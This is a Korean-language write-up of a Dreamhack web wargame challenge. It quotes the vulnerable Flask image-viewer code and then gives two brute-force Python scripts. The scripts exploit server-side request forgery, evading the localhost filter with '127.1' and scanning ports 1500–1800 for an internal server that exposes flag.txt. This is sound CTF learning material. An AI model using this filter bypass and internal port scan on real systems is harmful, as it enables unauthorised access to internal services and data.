created: 2026-01-24 02:59
category: #web 
link: https://dreamhack.io/wargame/challenges/75

# Write-up
```python
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        # url 문자열의 첫 문자는 "/" 여야함.
        if url[0] == "/":
            url = "http://localhost:8000" + url
        # if와 else if 모두를 우회할 수 있는 방법이 있을 수도...
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            print(data)
            img = base64.b64encode(data).decode("utf8")
        except Exception as ex:  # 에러 종류
            print("에러가 발생 했습니다", ex)  # ex는 발생한 에러의 이름을 받아오는 변수
            # except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)
```
- `/img_viewer` API로 request body로 받은 `url`값에 대한 검증 후 이미지 인코딩을 진행한다. 

```python
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)
print(local_port)


def run_local_server():
    local_server.serve_forever()


threading.Thread(target=run_local_server).start()
```
- 신기하게도 파이썬 flask의 서버말고도 `HTTPServer`가 하나 더 있다. 즉, 하나의 프로세스에서 두 개의 서버가 있고 각각 포트 번호가 다르다. 
	- flask 서버는 8000을 사용
- 포트 번호는 1500 ~ 1800에서 랜덤으로 정해진다. 

우선 플래그는 `/app/flag.txt`에 위치하는 데, 이는 flask 서버를 통해서는 접근할 수 없었다. flask는 기본적으로 정적 파일을 제공할 때 `/static` 디렉터리를 사용한다. 
하지만 두 번째 서버는 `SimpleHTTPRequestHandler`로 설정되어 있었는데, 그래서 정적 파일을 자유롭게 획득할 수 있다. 
따라서 `/img_viewer` API를 통해서 두 번째 서버로 요청을 날리는 SSRF 공격을 하여 플래그를 획득할 수 있을 것이라고 생각했다. 
즉, flask 서버를 통해서 `http://localhost:{두 번째 서버의 알맞은 포트 번호}/flag.txt`를 요청할 수만 있다면 플래그를 획득할 수 있다. 

### `/img_viewer` API의 url 필터링 우회하기
```python
url = request.form.get("url", "")
urlp = urlparse(url)
# url 문자열의 첫 문자는 "/" 여야함.
if url[0] == "/":
	url = "http://localhost:8000" + url
# if와 else if 모두를 우회할 수 있는 방법이 있을 수도...
elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
	data = open("error.png", "rb").read()
	img = base64.b64encode(data).decode("utf8")
	return render_template("img_viewer.html", img=img)
try:
	data = requests.get(url, timeout=3).content
	print(data)
	img = base64.b64encode(data).decode("utf8")
```
- 처음에는 `urlparse` 함수에서 `netloc`을 판별하는 데 있어 약간의 취약점이 있는 것을 활용하여 검증 우회를 하고 싶었다. 
- `netloc`은 `//`뒤에 있는 것이다. 따라서 그냥 `http://`를 빼고 `localhost:{두 번째 서버의 알맞은 포트 번호}/flag.txt`를 요청하려고 했다. 

그래서 다음과 같은 브루트 포스 코드를 작성하였다.
```python 
import requests
from bs4 import BeautifulSoup
import base64

for i in range(1500, 1800):
    url = "http://host3.dreamhack.games:21133/img_viewer"
    flag = f"localhost:{i}/flag.txt"
    data = {"url": flag}

    response = requests.post(url, data=data)
    soup = BeautifulSoup(response.text, "html.parser")

    img_tag = soup.find("img")
    data = img_tag["src"]

    try:
        # flag.txt 같은 문서라면 에러가 발생하지 않을 것.
        original = base64.b64decode(data[23:].encode("utf8")).decode("utf8")
        print(original)
        break
    except:
        print(f"skip port {i}")
```
- 그러나 1500 ~ 1800 포트 번호 모두 스캔하여도 플래그를 획득할 수 없었다. 뭔가 서버쪽에서 계속 에러가 발생하고 있던 것이다. 
- 그래서 아예 문제 파일을 로컬에서 실행하여 에러를 출력해보았다. 
- "requests.exceptions.InvalidSchema: No connection adapters were found for 'localhost:{port number}/flag.txt'"
- 검색해보니 `http://`를 붙여줘야한다고 했다. 

그래서 `http://`를 붙이면서 필터링을 우회할 방법을 찾아야했다. 이는 구글링을 통해 어렵지 않게 알아낼 수 있었다. 
방법은 매우 다양했는데, 그 중 하나인 "127.1"을 사용하기로 했다. 이는 "127.0.0.1"과 같은 의미이다. 

```python
import requests
from bs4 import BeautifulSoup
import base64

for i in range(1500, 1800):
    url = "http://host3.dreamhack.games:21133/img_viewer"
    flag = f"http://127.1:{i}/flag.txt"
    data = {"url": flag}

    response = requests.post(url, data=data)
    soup = BeautifulSoup(response.text, "html.parser")

    img_tag = soup.find("img")
    data = img_tag["src"]

    try:
        # flag.txt 같은 문서라면 에러가 발생하지 않을 것.
        original = base64.b64decode(data[23:].encode("utf8")).decode("utf8")
        print(original)
        break
    except:
        print(f"skip port {i}")
```
- 이런 식으로 `flag` 변수 부분만 수정하였고 몇 번의 반복 후에 플래그를 획득할 수 있었다.

# Reference
- https://docs.python.org/3/library/http.server.html#http.server.SimpleHTTPRequestHandler
- https://hbase.tistory.com/399
- https://flask.palletsprojects.com/en/stable/tutorial/static/
- https://hg2lee.tistory.com/entry/Servcer-Side-Requests-Forgery-SSRF
- https://portswigger.net/web-security/ssrf
- https://docs.python.org/3.7/library/urllib.parse.html
- https://blogwhatever.tistory.com/79